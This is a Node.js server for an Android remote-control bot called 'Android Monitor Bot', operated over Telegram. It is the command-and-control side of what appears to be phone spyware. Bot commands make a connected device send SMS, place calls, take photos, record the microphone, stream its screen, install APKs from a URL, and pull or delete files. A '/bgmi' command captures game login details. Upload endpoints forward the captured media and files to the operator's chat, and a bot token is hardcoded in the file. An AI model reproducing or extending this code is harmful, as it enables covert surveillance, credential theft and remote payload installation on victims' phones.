// server.js
require('dotenv').config(); // If using .env locally; on Render set env variables
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');
const multer = require('multer'); // You may need to install: npm install multer
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');

// --- Environment variables ---
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7357354055:AAH4W-B0qIRBRiNgts6KmeRRTUARauqwOMY';
const SUPABASE_URL = process.env.SUPABASE_URL;      // Set in Render
const SUPABASE_KEY = process.env.SUPABASE_KEY;      // Set in Render
const BASE_URL = process.env.BASE_URL;              // Your Render app URL (e.g., https://your-app.onrender.com)
const PORT = process.env.PORT || 3000;

// --- Initialize Supabase ---
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// --- Express & HTTP server ---
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const server = http.createServer(app);

// --- Socket.IO ---
const io = new Server(server, {
  cors: { origin: '*' } // Allow connections from Android client and viewer page
});

// --- Telegram Bot (webhook mode) ---
const bot = new TelegramBot(TELEGRAM_TOKEN);
bot.setWebHook(`${BASE_URL}/webhook`);

// --- In-memory stores ---
const chatToSocket = new Map();           // chatId -> socket object
const pendingCommands = new Map();        // requestId -> { resolve, reject, timeout }
const streamToChat = new Map();           // streamId -> chatId (for live streams)

// --- Utility: send command to device via Socket.IO with promise ---
function sendCommandToDevice(chatId, command, params = {}, timeoutMs = 30000) {
  return new Promise((resolve, reject) => {
    const socket = chatToSocket.get(chatId);
    if (!socket) {
      return reject(new Error('Device not connected'));
    }

    const requestId = uuidv4();
    const timeout = setTimeout(() => {
      pendingCommands.delete(requestId);
      reject(new Error('Command timed out'));
    }, timeoutMs);

    pendingCommands.set(requestId, { resolve, reject, timeout });

    socket.emit('command', {
      requestId,
      command,
      params
    });
  });
}

// --- Socket.IO event handling ---
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);

  // Register device
  socket.on('register', async (data) => {
    const { deviceId, chatId } = data;
    if (!deviceId || !chatId) {
      socket.emit('error', 'Missing deviceId or chatId');
      return;
    }

    // Store mapping
    socket.deviceId = deviceId;
    socket.chatId = chatId;
    chatToSocket.set(chatId, socket);

    // Update Supabase: devices table (id, device_id, chat_id, last_seen)
    await supabase.from('devices').upsert({
      device_id: deviceId,
      chat_id: chatId,
      last_seen: new Date().toISOString()
    }, { onConflict: 'chat_id' });

    console.log(`Device registered: ${deviceId} for chat ${chatId}`);
    socket.emit('registered', { status: 'ok' });
  });

  // Response from device for a command
  socket.on('command_response', (data) => {
    const { requestId, success, data: result, error } = data;
    const pending = pendingCommands.get(requestId);
    if (pending) {
      clearTimeout(pending.timeout);
      pendingCommands.delete(requestId);
      if (success) {
        pending.resolve(result);
      } else {
        pending.reject(new Error(error || 'Command failed'));
      }
    }
  });

  // Live stream frames
  socket.on('stream_frame', (data) => {
    const { streamId, frame } = data; // frame can be base64 or binary
    // Broadcast to all viewers in that stream room
    io.to(streamId).emit('frame', frame);
  });

  socket.on('disconnect', () => {
    // Remove from mapping
    if (socket.chatId) {
      chatToSocket.delete(socket.chatId);
    }
    console.log('Client disconnected:', socket.id);
  });
});

// --- Telegram webhook endpoint ---
app.post('/webhook', (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// --- Telegram command handlers ---
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    '✅ Android Monitor Bot\n\n' +
    'Connect your device via the Android app, then use commands:\n' +
    '/sms <number> <message>\n/call <number>\n/lock\n/unlock\n/camera\n/apk <url>\n/toast <text>\n/mic <15|60|last>\n/audio <url>\n/live\n/battery\n/files\n/download <filepath>\n/delete <filepath>\n/flashlight <on|off>\n/bgmi'
  );
});

bot.onText(/\/sms (.+?) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1];
  const message = match[2];
  try {
    const result = await sendCommandToDevice(chatId, 'sms', { number, message });
    bot.sendMessage(chatId, `✅ SMS sent: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/call (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1];
  try {
    const result = await sendCommandToDevice(chatId, 'call', { number });
    bot.sendMessage(chatId, `✅ Call initiated: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/lock/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const result = await sendCommandToDevice(chatId, 'lock', {});
    bot.sendMessage(chatId, `✅ Device locked: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/unlock/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const result = await sendCommandToDevice(chatId, 'unlock', {});
    bot.sendMessage(chatId, `✅ Device unlocked: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/camera/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    // Tell device to capture photo; photo will be uploaded via HTTP later
    await sendCommandToDevice(chatId, 'camera', {});
    bot.sendMessage(chatId, '📸 Capturing photo... It will be sent automatically.');
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/apk (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];
  try {
    const result = await sendCommandToDevice(chatId, 'install_apk', { url });
    bot.sendMessage(chatId, `✅ APK installation started: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/toast (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  try {
    const result = await sendCommandToDevice(chatId, 'toast', { text });
    bot.sendMessage(chatId, `✅ Toast shown: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/mic (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const duration = match[1]; // "15", "60", "last"
  try {
    await sendCommandToDevice(chatId, 'mic', { duration });
    bot.sendMessage(chatId, `🎤 Recording ${duration} seconds... Audio will be sent.`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/audio (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];
  try {
    const result = await sendCommandToDevice(chatId, 'play_audio', { url });
    bot.sendMessage(chatId, `🔊 Playing audio: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/live/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const streamId = uuidv4();
    streamToChat.set(streamId, chatId);
    // Tell device to start streaming with this streamId
    await sendCommandToDevice(chatId, 'start_stream', { streamId });
    const streamUrl = `${BASE_URL}/stream/${streamId}`;
    bot.sendMessage(chatId, `📡 Live stream started. Open this link in your browser:\n${streamUrl}\n(60fps, low latency)`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/battery/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const result = await sendCommandToDevice(chatId, 'battery', {});
    const { level, charging, model } = result;
    bot.sendMessage(chatId, `🔋 Battery: ${level}%\n⚡ Charging: ${charging ? 'Yes' : 'No'}\n📱 Model: ${model}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/files/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const result = await sendCommandToDevice(chatId, 'list_files', { path: '/' });
    let reply = '📁 Files:\n';
    result.files.forEach(file => {
      reply += `- ${file.name} (${file.size} bytes)\n`;
    });
    bot.sendMessage(chatId, reply);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/download (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const filepath = match[1];
  try {
    await sendCommandToDevice(chatId, 'upload_file', { filepath });
    bot.sendMessage(chatId, `⬇️ Downloading ${filepath}... File will be sent.`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/delete (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const filepath = match[1];
  try {
    const result = await sendCommandToDevice(chatId, 'delete_file', { filepath });
    bot.sendMessage(chatId, `✅ Deleted: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/flashlight (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const state = match[1]; // "on" or "off"
  try {
    const result = await sendCommandToDevice(chatId, 'flashlight', { state });
    bot.sendMessage(chatId, `🔦 Flashlight turned ${state}: ${result}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/\/bgmi/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const result = await sendCommandToDevice(chatId, 'bgmi_capture', {});
    bot.sendMessage(chatId, `🎮 BGMI login details:\n${JSON.stringify(result, null, 2)}`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// --- HTTP upload endpoints (for device to send files) ---
const upload = multer({ dest: 'uploads/' });
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');

// Photo upload
app.post('/upload/photo', upload.single('photo'), async (req, res) => {
  const { chatId } = req.body;
  if (!req.file || !chatId) {
    return res.status(400).send('Missing file or chatId');
  }
  try {
    await bot.sendPhoto(chatId, fs.createReadStream(req.file.path), { caption: '📸 Camera capture' });
    fs.unlinkSync(req.file.path);
    res.send('OK');
  } catch (err) {
    console.error('Error sending photo:', err);
    res.status(500).send('Error');
  }
});

// Audio upload
app.post('/upload/audio', upload.single('audio'), async (req, res) => {
  const { chatId } = req.body;
  if (!req.file || !chatId) {
    return res.status(400).send('Missing file or chatId');
  }
  try {
    await bot.sendAudio(chatId, fs.createReadStream(req.file.path), { caption: '🎤 Microphone recording' });
    fs.unlinkSync(req.file.path);
    res.send('OK');
  } catch (err) {
    console.error('Error sending audio:', err);
    res.status(500).send('Error');
  }
});

// File upload (for download command)
app.post('/upload/file', upload.single('file'), async (req, res) => {
  const { chatId, filename } = req.body;
  if (!req.file || !chatId) {
    return res.status(400).send('Missing file or chatId');
  }
  try {
    await bot.sendDocument(chatId, fs.createReadStream(req.file.path), { caption: `📄 File: ${filename || 'download'}` });
    fs.unlinkSync(req.file.path);
    res.send('OK');
  } catch (err) {
    console.error('Error sending file:', err);
    res.status(500).send('Error');
  }
});

// --- Live stream viewer page ---
app.get('/stream/:streamId', (req, res) => {
  const streamId = req.params.streamId;
  if (!streamToChat.has(streamId)) {
    return res.status(404).send('Stream not found');
  }
  // Serve a simple HTML page that connects to Socket.IO and displays frames
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Live Stream</title>
      <script src="/socket.io/socket.io.js"></script>
      <style>
        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { max-width: 100%; max-height: 100%; object-fit: contain; }
      </style>
    </head>
    <body>
      <img id="live-frame" src="" />
      <script>
        const socket = io();
        const streamId = "${streamId}";
        socket.emit('join-stream', streamId);
        socket.on('frame', (frameData) => {
          document.getElementById('live-frame').src = 'data:image/jpeg;base64,' + frameData;
        });
      </script>
    </body>
    </html>
  `);
});

// Socket.IO: allow viewers to join a stream room
io.on('connection', (socket) => {
  socket.on('join-stream', (streamId) => {
    socket.join(streamId);
  });
});

// --- Start server ---
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Telegram webhook set to: ${BASE_URL}/webhook`);
});